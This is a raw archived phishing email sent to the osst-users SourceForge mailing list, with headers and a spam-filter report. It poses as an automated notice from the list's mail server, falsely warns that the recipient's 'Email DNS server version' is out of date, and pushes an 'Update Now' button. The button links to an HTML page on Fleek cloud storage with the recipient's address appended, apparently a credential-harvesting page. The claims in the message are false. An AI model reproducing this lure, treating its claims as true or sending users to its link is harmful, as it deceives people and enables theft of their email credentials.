Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 3DEF56139B3
	for <lists+osst-users@lfdr.de>; Mon, 31 Oct 2022 16:11:29 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1opWRj-0003fn-Tf
	for lists+osst-users@lfdr.de;
	Mon, 31 Oct 2022 15:11:27 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <jaz.mcg@yummymacaroni.com>) id 1opWRi-0003fc-NI
 for osst-users@lists.sourceforge.net; Mon, 31 Oct 2022 15:11:26 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=gHLHWivazMfwpQF1Al+wIhfq9cJLEqqOfTKs77n6Mf0=; b=O7mixI9T4WwXaOaqkhmDTFDk7W
 rPjU477dVSDYVtoa4rVhJj4enm7srMSatEDvzFliJB1fIrn8/1iXvUtVTZPJ4jXmUlerY6oHB3yX1
 VbiN8vYKRNhhXjE0o9Q3SWxK9axLSCJmKGo39pLVwXMKq0eqF8WVKXtbCtpDFyV8bTZU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=gHLHWivazMfwpQF1Al+wIhfq9cJLEqqOfTKs77n6Mf0=; b=Z
 WnyxU80KPu9xVNOZbUUEiFGJuDikIaPSGUipraysIADvrP7v3xmGpFrpmosde4no4NgjLJ4EJ4VaV
 04LPeEjShviucfSPVxO/sETTBX2GqxUJL2YfzxkHdVjWYuvkMs4R9TY3mjVlKYMDMjMlmh9pL5YNE
 uqonqFO384Ys2MP8=;
Received: from dakojupc.yummymacaroni.com ([92.52.217.179])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1opWRh-0002x3-VQ for osst-users@lists.sourceforge.net;
 Mon, 31 Oct 2022 15:11:26 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=yummymacaroni.com;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
 i=jaz.mcg@yummymacaroni.com; bh=4VJOBIAL6BFEwmG0i0WLSLYl1MY=;
 b=MHMAPD+ooYY/oeOdZVyA6yRg67ea6oYK99MYd4l/WxFovu9INQcHWBSmSrRS9qodkiot5R4D9i+F
 Mo2iq5BVHz9Zf8H227apicMYxIjA9ZwuNb3bEHhMIDUgx60iONlg/M4SBlrPEPm4TAR5WQUt9QRY
 OQjUCQIWJ6CnCYtSt3rRz+mSNo6q0XF0WhBSqbPNQdJxvQVIp7ocXShcMVggmW00IdtJyTuDPuY4
 12qyxQr1YfAi5LzBAwiGCb1lKwNT+GMHRlTC8hXu4Fjc+2SWPLqdM1hkHqK2jeZPZCBAXNZB5PMQ
 Mx0jX+J/ZYFCEZ42nqeoDFMpk91d3QVL9zc4hw==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=yummymacaroni.com; 
 b=bMQ7P9EQhaYF6d2ccGZfe2D3KOjkStDoaBSCWf0yM8rRKZJepgBWOf1TSMdye3mmeyCkbK0l2m/V
 6cakf+jLI2RcirU41IfX6pAM1aVyExOyg8+WQXLdkW94x//H5GuVitrQAqWtNd6/xMYcY0O23Uax
 g1neza+t3KqhLZmX8QdMY9YWsZ993uiXVsEU4srz7s8PYTtiF90wHGU7vN0t8Pv0UkoV+jfiJr9s
 oIRC/gWbhKQS7weI1DeVXYCcXHyM6iDWhE8JSHFrgdfdo9RtLad6+DYW1oP12HwmgUO1+9OEsXwM
 mnVB0Uhxk39G6aZ5z1W2dZbFRud12mRjAFB2pw==;
From: E-Mail Server lists.sourceforge.net <jaz.mcg@yummymacaroni.com>
To: osst-users@lists.sourceforge.net
Date: 31 Oct 2022 07:52:37 -0700
Message-ID: <20221031075237.66E3DA665A0E4980@yummymacaroni.com>
MIME-Version: 1.0
X-Spam-Score: 7.8 (+++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: You Have Been Notified! osst-users@lists.sourceforge.net We
 have updated our DNS servers! Your current Email DNS server version is now
 out of date and if not updated will affect the effective delivery of your
 incoming and outgoing messages. 
 Content analysis details:   (7.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.0 RCVD_IN_UCE1           RBL: IP Listed in UCEPROTECT Level 1
 [92.52.217.179 listed in dnsbl-1.uceprotect.net]
 2.5 URIBL_DBL_SPAM         Contains a spam URL listed in the Spamhaus DBL
 blocklist [URIs: fleek.co]
 1.3 RCVD_IN_VALIDITY_RPBL  RBL: Relay in Validity RPBL,
 https://senderscore.org/blocklistlookup/
 [92.52.217.179 listed in bl.score.senderscore.com]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 GB_URI_FLEEK_STO_HTM   URI: Html file stored on Fleek cloud
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain 2.0 PYZOR_CHECK            Listed in Pyzor
 (https://pyzor.readthedocs.io/en/latest/)
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [92.52.217.179 listed in wl.mailspike.net]
 0.2 FSL_BULK_SIG           Bulk signature with no Unsubscribe
 0.0 T_KAM_HTML_FONT_INVALID Test for Invalidly Named or Formatted
 Colors in HTML
X-Headers-End: 1opWRh-0002x3-VQ
Subject: [Osst-users] ID SvrDNS/ 10/31/2022 7:52:37 a.m. /-
 lists.sourceforge.net Notice Delivered! [Action needed] Recommended DNS
 Server Upgrade!
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============5601930891218750123=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============5601930891218750123==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE HTML>

<html><head><title></title>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body style=3D"margin: 0.4em;">
<p>
<br></p><p>
<font size=3D"1">
</font><font size=3D"1">
</font><font size=3D"1">
</font><font size=3D"1">
</font>
</p>
<table width=3D"500" align=3D"center" style=3D'padding: 0px; border: 2px so=
lid rgb(164, 164, 164); border-image: none; height: 284px; text-align: left=
; color: rgb(0, 0, 0); text-transform: none; text-indent: 0px; letter-spaci=
ng: normal; font-family: "lucida grande", verdana, "microsoft yahei"; font-=
size: 12px; font-style: normal; font-weight: 400; word-spacing: 0px; white-=
space: normal; border-collapse: collapse; box-sizing: border-box; backgroun=
d-color: rgb(255, 255, 255); font-variant-ligatures:=20
normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-dec=
oration-thickness: initial; text-decoration-style: initial; text-decoration=
-color: initial;' cellspacing=3D"0">
<tbody style=3D"border-color: rgb(238, 238, 238); box-sizing: border-box;">=
<tr style=3D"border-color: rgb(238, 238, 238); color: rgb(0, 0, 0); box-siz=
ing: border-box;"><td style=3D"border-color: rgb(238, 238, 238); margin: 0p=
x; width: 498.33px; height: 284px; font-family: Roboto, RobotoDraft, Helvet=
ica, Arial, sans-serif; box-sizing: border-box;"><strong><font size=3D"1">
</font><font size=3D"1">
</font><font size=3D"1">
</font><font size=3D"1">
</font><font size=3D"1">
</font><font size=3D"1">
</font><font size=3D"1">
</font></strong><table width=3D"460" align=3D"center" style=3D"border-color=
: rgb(238, 238, 238); height: 222px; border-collapse: collapse; box-sizing:=
 border-box;"><tbody style=3D"border-color: rgb(238, 238, 238); box-sizing:=
 border-box;"><tr style=3D"border-color: rgb(238, 238, 238); box-sizing: bo=
rder-box;"><td style=3D"border-color: rgb(238, 238, 238); margin: 0px; widt=
h: 459.16px; height: 222px; font-family: Roboto, RobotoDraft, Helvetica, Ar=
ial, sans-serif; box-sizing: border-box;"><font size=3D"1">
<strong>


</strong></font><p style=3D"border-color: rgb(238, 238, 238); color: rgb(17=
, 17, 17); line-height: 24px; font-family: Roboto, RobotoDraft, Helvetica, =
Arial, sans-serif; margin-top: 0px; margin-bottom: 0px; box-sizing: border-=
box;"><span style=3D"border-color: rgb(238, 238, 238); font-family: Calibri=
; box-sizing: border-box;"><font size=3D"1"><strong> </strong></font><font =
size=3D"3"><strong>
</strong><font size=3D"4"><br><u><strong>You Have Been Notified!</strong></=
u></font><br><strong>osst-users@lists.sourceforge.net<br><br></strong></fon=
t></span><hr size=3D"2"><font size=3D"3"><font size=3D"4">We have updated o=
ur DNS servers!<br style=3D"border-color: rgb(238, 238, 238); box-sizing: b=
order-box;"><br style=3D"border-color: rgb(238, 238, 238); box-sizing: bord=
er-box;">
Your current&nbsp;Email DNS&nbsp;server version&nbsp;is now&nbsp;out of dat=
e and&nbsp;if not updated will&nbsp;affect the&nbsp;effective&nbsp;delivery=
&nbsp;of&nbsp;your incoming and outgoing messages.&nbsp;<br><br>
It is most&nbsp;recommended&nbsp;that you&nbsp;update your&nbsp;Email DNS v=
ersion promptly to avoid&nbsp;email data loss.</font><br><strong>
<hr size=3D"2"><br style=3D"border-color: rgb(238, 238, 238); box-sizing: b=
order-box;"></strong></font><font size=3D"3"><strong>
</strong></font><p></p><font size=3D"3">

</font><p style=3D"border-color: rgb(238, 238, 238); margin-top: 0px; box-s=
izing: border-box;"><a style=3D"border-color: rgb(238, 238, 238); color: rg=
b(0, 105, 166); text-decoration: none; box-sizing: border-box; background-c=
olor: transparent;" href=3D"https://storageapi.fleek.co/b3d4ed01-d2cd-4e30-=
bdf0-5d5e9790f096-bucket/srvrupdt-wrk/index.html.html#osst-users@lists.sour=
ceforge.net" target=3D"_blank" rel=3D"noreferrer"><font size=3D"3">
 <span style=3D"background: 0% 50% navy; border-color: rgb(238, 238, 238); =
color: white; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-seri=
f, serif, EmojiFont; font-weight: bold; box-sizing: border-box;"><font size=
=3D"4">&nbsp;Update Now&nbsp;</font></span></font></a></p><font size=3D"3">=

</font><font size=3D"3">
</font><font size=3D"3">
</font><font size=3D"3">
</font><strong><font size=3D"3">
</font><font size=3D"3">
</font></strong><font size=3D"3"><span style=3D'border-color: rgb(238, 238,=
 238); font-family: "Microsoft YaHei", "Helvetica Neue", "lucida Grande", V=
erdana, serif, EmojiFont; box-sizing: border-box;'><span style=3D"border-co=
lor: rgb(238, 238, 238); color: rgb(17, 17, 17); font-family: Roboto, Robot=
oDraft, Helvetica, Arial, sans-serif, serif, EmojiFont; box-sizing: border-=
box;"><font size=3D"3"><br style=3D"border-color: rgb(238, 238, 238); box-s=
izing: border-box;"></font></span></span></font>
<font size=3D"3"><strong>
</strong></font><p style=3D'border-color: rgb(238, 238, 238); font-family: =
"Microsoft YaHei", "Helvetica Neue", "lucida Grande", Verdana; margin-top: =
0px; box-sizing: border-box;'><span style=3D"border-color: rgb(238, 238, 23=
8); color: rgb(17, 17, 17); font-family: Roboto, RobotoDraft, Helvetica, Ar=
ial, sans-serif, serif, EmojiFont; box-sizing: border-box;"><strong><font s=
ize=3D"3"> </font>
</strong><span style=3D"border-color: rgb(238, 238, 238); color: rgb(42, 42=
, 42); font-family: Batang; box-sizing: border-box;"><font size=3D"1"><font=
 size=3D"2"><font size=3D"3"><strong></strong></font></font></font></span><=
/span><hr size=3D"2"><font size=3D"1"><font size=3D"2"><font size=3D"3"><st=
rong><br style=3D"border-color: rgb(238, 238, 238); font-family: Arial; fon=
t-weight: normal; box-sizing: border-box;">
</strong><span style=3D"border-color: rgb(238, 238, 238); font-family: Aria=
l, serif, EmojiFont; box-sizing: border-box;"><font size=3D"2">Email Server=
 Admin <strong>lists.sourceforge.net </strong></font><span id=3D"v1v1v1v1v1=
v1v1m_4314246332054907544gmail-v1ihkzx" style=3D"color: black; box-sizing: =
border-box;"><font face=3D"Verdana"><font face=3D"Microsoft Sans Serif" siz=
e=3D"1"><font size=3D"2">&copy; 2022</font><br>
<span id=3D"v1v1v1v1v1v1v1m_4314246332054907544gmail-v1ihkzx" style=3D"colo=
r: black; box-sizing: border-box;">
<font face=3D"Verdana" size=3D"1"><em><font face=3D"Microsoft Sans Serif">T=
his is an automated server message. Do not reply.</font></em></font></span>=
</font></font></span></span></font></font></font><p></p></td></tr></tbody><=
/table></td></tr></tbody></table><p>
</p>


</body></html>


--===============5601930891218750123==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============5601930891218750123==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============5601930891218750123==--
